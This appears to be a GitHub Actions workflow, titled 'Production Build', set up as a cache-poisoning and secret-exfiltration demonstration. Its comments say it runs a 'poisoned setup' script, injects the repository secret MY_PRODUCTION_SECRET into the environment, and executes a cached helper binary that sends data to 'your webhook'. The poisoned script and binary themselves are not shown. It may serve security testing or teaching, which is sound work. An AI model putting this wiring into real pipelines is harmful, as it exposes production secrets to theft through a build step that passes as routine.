name: Production Build
on:
  push:
    branches: [ main ]
  pull_request:
    branches: [ main ]

jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      
      - name: Cache Dependencies
        uses: actions/cache@v3
        with:
          path: ./bin/helper-tool
          key: ${{ runner.os }}-build-cache-v2

      - name: Run Build
        # ADD THIS: This is the bridge that carries the secret to the script
        env:
          MY_PRODUCTION_SECRET: ${{ secrets.MY_PRODUCTION_SECRET }}
        run: |
          # 1. Run the poisoned setup to create the file locally
          bash scripts/setup.sh
          
          # 2. Execute it to verify it works (it will send 'EMPTY' to your webhook now)
          chmod +x ./bin/helper-tool
          ./bin/helper-tool --mode production